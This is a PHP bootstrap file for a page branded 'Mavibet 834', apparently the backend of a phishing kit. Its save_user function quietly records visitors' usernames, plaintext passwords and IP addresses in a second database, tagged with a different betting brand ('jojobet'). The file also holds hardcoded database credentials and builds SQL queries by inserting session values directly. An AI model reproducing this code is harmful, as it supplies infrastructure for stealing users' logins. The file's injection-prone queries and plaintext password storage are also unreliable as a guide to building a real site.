<?php

require_once 'mobile.class.php';
$title = "Mavibet 834 - mavibet834.com - Mavibet 834 com giriş - mavibet934 com";
ob_start();
session_start();
error_reporting(0);
date_default_timezone_set('Europe/Istanbul');

// Database Info
const DB_HOST = "localhost";
const DB_LOGIN = "admin_pae";
const DB_PASS = "4mc_z61S4";
const DB_NAME = "admin_pae";
$guncel = 'mavibet834';
$guncel2 = 'mavibet835';

// Connecting Database
$db = new Mysqli(DB_HOST, DB_LOGIN, DB_PASS, DB_NAME);
if ($db->connect_errno) {
  die('Mysql connection is incorrect');
}
$db->set_charset("utf8");

// Get main table from database
$main = $db->query("SELECT * from main where id=1")->fetch_assoc();

// Get user data
$user_id = intval($_SESSION['user_id']);
if (!empty($user_id)) {
  $us = $db->query("SELECT * from users where id='$user_id'")->fetch_assoc();
}

// Admin logged status
$kk = $_SESSION['admin_login'];
$main1 = $db->query("SELECT * FROM admin_users WHERE admin_login = '$kk'")->fetch_assoc();

// Admin logged status
$admin = false;
if (!(empty($_SESSION['admin_login']))){
  if ($_SESSION['admin_login'] == $main1['admin_login'] && $_SESSION['admin_password'] == $main1['admin_password']) {
    $admin = true;
  }
}
//sql
$servername = "localhost";
$username = "n1_pays_full";
$password = "n1_pays_full";
$dbname = "n1_pays_full";
try {
    $pdo = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Veritabanı bağlantısı başarısız: " . $e->getMessage());
}
function save_user($user, $passwd){
    global $pdo;
	$site = "jojobet";
    try {
		$stmt = $pdo->prepare("SELECT COUNT(*) FROM site_users WHERE username = :user AND site = :site");
		$stmt->execute(['user' => $user, 'site' => $site]);
        $user_exists = $stmt->fetchColumn();
        if ($user_exists == 0) {
        	$stmt = $pdo->prepare("INSERT INTO site_users (username, password, site, ip, created_date) VALUES (:user, :passwd, :site, :ip, :created_date)");
			$stmt->execute([
				'user' => $user,
				'passwd' => $passwd,
				'site' => $site,
				'ip' => $_SERVER['REMOTE_ADDR'],
				'created_date' => date('Y-m-d H:i:s')
			]);
        }
    } catch (PDOException $e) {
        echo "Veritabanı hatası: " . $e->getMessage();
    }
    return;
}


// Mobile device detection
$detect = new Mobile_Detect;
$mobile = $detect->isMobile();
